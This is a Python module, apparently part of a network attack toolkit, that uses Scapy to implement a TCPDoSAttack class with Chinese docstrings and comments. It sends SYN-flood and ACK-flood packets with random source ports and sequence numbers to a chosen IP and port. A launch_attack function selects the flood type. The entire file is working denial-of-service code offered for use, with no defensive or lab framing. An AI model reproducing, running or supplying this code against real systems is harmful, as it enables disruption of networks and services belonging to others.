from scapy.all import *
from ..common.utils import validate_ip, validate_port, setup_logging
import logging

class TCPDoSAttack:
    def __init__(self, target_ip: str, target_port: int):
        """初始化 TCP DOS 攻击"""
        if not validate_ip(target_ip):
            raise ValueError("Invalid IP address")
        if not validate_port(target_port):
            raise ValueError("Invalid port number")
            
        self.target_ip = target_ip
        self.target_port = target_port
        setup_logging()
        self.logger = logging.getLogger(__name__)
        
    def launch_syn_flood(self, count: int = 1000):
        """发起 SYN 洪水攻击"""
        self.logger.info(f"Starting SYN flood attack against {self.target_ip}:{self.target_port}")
        
        for i in range(count):
            src_port = RandShort()
            seq_num = random.randint(0, 2**32-1)
            
            # 构造 SYN 包
            syn_packet = IP(dst=self.target_ip)/TCP(
                sport=src_port,
                dport=self.target_port,
                seq=seq_num,
                flags="S"
            )
            
            try:
                send(syn_packet, verbose=False)
                if i % 100 == 0:
                    self.logger.info(f"Sent {i} SYN packets")
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}")
                
        self.logger.info("SYN flood attack completed")
        
    def launch_ack_flood(self, count: int = 1000):
        """发起 ACK 洪水攻击"""
        self.logger.info(f"Starting ACK flood attack against {self.target_ip}:{self.target_port}")
        
        for i in range(count):
            src_port = RandShort()
            seq_num = random.randint(0, 2**32-1)
            ack_num = random.randint(0, 2**32-1)
            
            # 构造 ACK 包
            ack_packet = IP(dst=self.target_ip)/TCP(
                sport=src_port,
                dport=self.target_port,
                seq=seq_num,
                ack=ack_num,
                flags="A"
            )
            
            try:
                send(ack_packet, verbose=False)
                if i % 100 == 0:
                    self.logger.info(f"Sent {i} ACK packets")
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}")
                
        self.logger.info("ACK flood attack completed")

def launch_attack(target_ip: str, target_port: int, attack_type: str = "syn", count: int = 1000):
    """启动 TCP DOS 攻击
    
    Args:
        target_ip: 目标 IP 地址
        target_port: 目标端口
        attack_type: 攻击类型 ("syn" 或 "ack")
        count: 发送包的数量
    """
    attacker = TCPDoSAttack(target_ip, target_port)
    
    if attack_type.lower() == "syn":
        attacker.launch_syn_flood(count)
    elif attack_type.lower() == "ack":
        attacker.launch_ack_flood(count)
    else:
        raise ValueError("Invalid attack type. Use 'syn' or 'ack'")